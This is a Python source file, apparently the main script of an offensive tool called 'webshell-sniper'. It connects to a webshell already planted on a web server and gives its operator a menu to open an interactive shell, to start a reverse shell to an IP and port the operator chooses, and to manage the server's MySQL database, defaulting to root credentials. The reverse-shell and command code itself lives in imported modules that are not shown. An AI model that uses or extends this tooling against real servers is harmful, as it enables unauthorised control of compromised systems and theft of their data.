#!/usr/bin/env python
# encoding: utf-8

from core.webshell import WebShell
from core.shell import Shell
from core.log import Log
from core.db import Mysql

import sys
import string

def show_help():
    print "Usage : "
    print "        python %s [URL] [METHOD] [PASSWORD]" % (sys.argv[0])
    print "Example : "
    print "        python %s http://127.0.0.1/c.php POST c" % (sys.argv[0])
    print "Author : "
    print "        WangYihang <wangyihanger@gmail.com>"
    print "Github : "
    print "        https://github.com/wangyihang/webshell-sniper"

def main_help():
    print "Commands : "
    print "        0. [h|help|?] : show this help"
    print "        1. [sh|shell] : start an interactive shell"
    print "        2. [rsh|rshell] : start an reverse shell"
    print "        3. [db|database] : database manager"
    print "        4. [q|quit|exit] : quit"

def main():
    if len(sys.argv) != 4:
        show_help()
        exit(1)
    url = sys.argv[1]
    method = sys.argv[2]
    password = sys.argv[3]
    webshell = WebShell(url, method, password)
    if not webshell.working:
        Log.error("The webshell cannot work...")
        exit(2)

    main_help()

    while True:
        Log.context("sniper")
        context = string.lower(raw_input("=>") or "h")
        if context == "h" or context == "help" or context == "?":
            main_help()
        elif context == "sh" or context == "shell":
            shell = Shell(webshell)
            shell.interactive()
        elif context == "rsh" or context == "rshell":
            ip = raw_input("[IP] : ")
            port = raw_input("[PORT] : ")
            Log.info("Starting reverse shell (%s:%s)" % (ip, port))
            webshell.reverse_shell(ip, port)
        elif context == "db" or context == "database":
            ip = raw_input("IP (127.0.0.1): ") or "127.0.0.1"
            username = raw_input("Username (root): ") or "root"
            password = raw_input("Password (root): ") or "root"
            Log.info("Creating connection by [%s:%s] to [%s]..." % (username, password, ip))
            mysql_connection = Mysql(webshell, ip, username, password)
            if mysql_connection.function != "":
                Log.info("Entering database server interactive mode...")
                mysql_connection.interactive()
            else:
                Log.error("No supported database function!")
        elif context == "q" or context == "quit" or context == "exit":
            Log.info("Quiting...")
            break
        else:
            Log.error("Unsupported command!")
            main_help()

if __name__ == "__main__":
    main()
